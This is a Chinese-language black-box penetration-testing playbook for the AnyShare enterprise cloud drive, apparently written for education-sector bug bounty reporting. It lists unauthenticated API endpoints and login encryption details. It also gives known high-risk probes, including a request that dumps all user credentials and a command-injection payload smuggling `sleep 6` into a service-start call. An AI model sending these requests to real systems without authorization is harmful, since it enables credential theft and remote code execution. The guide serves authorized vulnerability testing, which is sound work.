# 爱数 AnyShare 企业网盘 黑盒测试手册

## 适用条件

- 指纹：`app="AISHU-AnyShare"`，页面加载 `/scripts/main.js` + `/libs/pdf.js`，登录前调用 `/api/v1/auth1?method=getconfig`。
- 版本线索：getconfig 回包 `server_version`（如 `6.0.15-20210601-427`）、`hardware_type`（ASE-S / ASE）。

## 已验证路径一：代理与出口可达性（前置）

- AnyShare 常部署在校园网，IPv4 出口常被 CERNET 过滤（直连 000/超时）；A 记录能解析不代表可达。
- 先 `dig +tcp +short AAAA <host> @8.8.8.8` 找 IPv6（教育网常见 `2001:250::/32`），但容器/本机若无 IPv6 出口则不可用。
- **必须用 example.com 反证代理是否劫持**：部分代理（如某 :7302 段）对任意目标返回固定伪造响应（本例为 200 + `{"code":"0x01900012","message":"check token fail"}`，或对 S3 返回 51 字节 JSON）。直连基线 + example.com 基线都对得上，代理结果才可信。
- 换出口试：同一 URL 在不同代理上结果差异极大（可达/超时/伪造），逐个轮询。

## 已验证路径二：登录前未授权接口（信息泄露面）

模块化路由：`/api/v1/{module}?method={method}`，POST JSON。

可匿名调用（无需 Cookie/Token）：
- `GET /api/v1/auth1?method=getconfig` —— 完整站点配置：`server_version`、`hardware_type`、`windows_ad_sso.is_enabled`、`vcode_login_config`（验证码策略）、`csf_level_enum`（密级）、`thirdauth.id`、`smtp_server_exists`、`oemconfig`。**泄露服务端版本/配置面，为 CVE 定位提供精确版本。**
- `GET /api/v1/auth1?method=servertime`
- `GET /api/v1/auth1?method=getoauthinfo`
- `POST /api/v1/auth1?method=getvcode`（返回图形验证码 base64 + 新 uuid）
- `POST /api/v1/config?method=getdocwatermarkconfig`（水印配置，含机构名）
- `POST /api/v1/config?method=getoemconfigbysection` body `{"section":"anyshare"}` 或 `{"section":"shareweb_zh-cn"}`（OEM 配置、favicon）

判级：仅版本/配置泄露属 intel/低危；若 getconfig 含明文密钥/口令才升档。

## 已验证路径三：业务接口鉴权基线

EFSHttpServer 侧业务接口（`dir/file/link/search/entrydoc/entrydoc2/audit/owner/perm1/device/contactor/user/department`）在**无 TokenID 时统一返回**：
```
400 {"causemsg":"TokenID 格式错误。（错误提供者：EFSHttpServer...）","errcode":400002}
```
即先过 TokenID 校验才到业务逻辑——**无凭据时这些接口不可越权**（也挡住了 SQL 注入面）。这是「已鉴权」的正面证据，不是漏洞。

EAC 侧（`auth1/config`）无 TokenID 时可能报「URI 格式错误」——说明该方法存在但入参不对，可继续枚举方法名。

## 已知高危接口判别（重点步骤）

历史漏洞常挂在两个独立服务，**不在 /api/v1 下**：
- `POST /api/ShareMgnt/Usrm_GetAllUsers` body `[1,100]` → 未授权泄露全部用户（loginName/password）。
- `POST /api/ServiceAgent/start_service` body `["`sleep 6`"]` → 命令注入 RCE（时间盲）。

探测要点：
- 先发无副作用请求判接口是否存在。返回 nginx `Cannot POST /ShareMgnt/...`（404）→ **该实例未挂载该服务**（本例即如此），可排除。
- 若返回 200/业务错误则进一步按已知 POC 验证（RCE 用 `sleep` 时间差，勿用破坏性命令）。
- 也可探 `/api/v1/{module}` 形式（部分版本路由不同）。

## 已验证路径四：外链/分享越权面

- 分享链接：`https://<host>/link/<32位id>` → nginx 302 到 `/#/link/<id>`（SPA 路由，不带凭据）。
- API：`POST /api/v1/link?method=get|getinfo|listdir|checkperm` body `{"link":"<32hex>"}`：
  - 伪造/不存在 → `404 {"errcode":404008,"errmsg":"外链不存在。"}`
  - 需真实 `link_token:<sharing_id>` Cookie 才能访问分享内容，**无凭据不可越权**。
- `POST /api/v1/invitation?method=get` 伪造 id → `404025 共享邀请链接不存在`。
- `POST /api/v1/link?method=getlinkbyaccesscode` body `{"accesscode":"..."}` → 命中返回 `{"link":"<id>"}`，未命中返回 `{"link":""}`（可有限枚举提取码，注意限速）。
- 参考工具：GitHub `isHarryh/AnyShare-Unofficial`（匿名 client 走 link_token Cookie 机制）。

## 已验证路径五：登录接口与注入

- `POST /api/v1/auth1?method=getnew` body：`{"account":"...","password":"<RSA密文>","deviceinfo":{"ostype":6},"vcodeinfo":...}`。
- `password` 为 **RSA 加密**：公钥 n 硬编码在 main.js（搜索 `var h="BB24BD...`），e=`0x10001`，PKCS#1 v1.5 padding，`hex2b64` 后每 64 字符换行。ostype：0=未知 1=iOS 2=Android 3=WinPhone 4=Windows 5=Mac 6=Web 7=MobileWeb。
- 未加密/错误密文 → `500 RSA_private_decrypt error`。
- 账号错误 → `401 用户名或密码不正确`；触发验证码 → `401 请输入验证码`。**account 注入载荷与正常账号回包无稳定差异，且 EFS 侧先被 TokenID 拦**——SQLi 面基本封死。
- 登录启用验证码时（`vcode_login_config.isenable=true`），弱口令爆破不可行，勿做。

## 坑与信息泄露收尾

- source map：`/scripts/main.js.map`、`/styles/main.css.map` 通常 404（本例无）。
- `/OpenDocAPI/OpenDocAPI.tar.gz`、`/ComponentsAPI/ComponentsAPI.tar.gz`、`/HandBook/*.pdf` 等静态包可匿名下载（一般非敏感）。
- 从 `main.js` 提取接口清单：搜 `eachttp(`/`efshttp(` 调用点，得到 module/method 全表。

## 判级口径（EDUSRC）

- 未授权配置/版本泄露：intel / 低危（无敏感凭据时）。
- 未授权用户数据（Usrm_GetAllUsers 命中）：高危（可直接批量盗取用户身份权限，rating:edu-rating 高危#3）。
- ServiceAgent 命令注入：高危（RCE，rating:edu-rating 高危#1）。
- 外链越权读取他人文件：中危（水平权限绕过须打出实际危害）。
